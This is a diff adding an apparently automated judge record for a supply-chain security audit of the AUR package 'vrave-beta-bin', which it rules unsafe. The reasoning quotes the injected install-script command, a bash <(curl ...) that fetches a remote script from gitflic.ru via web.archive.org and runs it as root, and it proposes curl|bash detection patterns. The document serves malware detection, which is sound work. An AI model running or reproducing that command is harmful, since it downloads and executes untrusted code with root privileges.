@@ -1,0 +1,28 @@
+{
+  "package": "vrave-beta-bin",
+  "correct_verdict": "unsafe",
+  "confidence": "high",
+  "reasoning": "Both models independently identified the same critical supply-chain attack in vrave-beta-bin.install: a top-level `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)` command that downloads and executes arbitrary remote code from an unrelated host (gitflic.ru) during package installation. This is a textbook `curl | bash` attack vector with no legitimate purpose for a Brave browser package. The code runs with root privileges when pacman sources the install script. This is unambiguous malicious injection, not packaging hygiene or upstream behavior.",
+  "disagreement_analysis": null,
+  "coverage_issues": [],
+  "false_positives": [],
+  "false_negatives": [],
+  "re_audit_recommended": false,
+  "re_audit_focus": [],
+  "learnings": [
+    "Both models correctly identified the curl|bash pattern in install hooks - this attack vector is well-recognized",
+    "The use of web.archive.org as a proxy to obscure the true source (gitflic.ru) was correctly flagged by both models as suspicious obfuscation",
+    "Models correctly distinguished between legitimate install hook functions (post_install/post_upgrade) and top-level code that executes when the file is sourced",
+    "Consider adding automatic detection for bash <(curl...) and curl|bash patterns as a pre-filter before LLM review, since these are unambiguous attack signatures"
+  ],
+  "_judge_usage": {
+    "model": "qwen/qwen3.7-plus",
+    "prompt_tokens": 9133,
+    "completion_tokens": 967,
+    "cost": 0.00416032
+  },
+  "audits_judged": [
+    "20261014-030438-qwen-qwen3-235b-a22b-2507.md",
+    "20261014-030334-deepseek-deepseek-v4-flash.md"
+  ]
+}
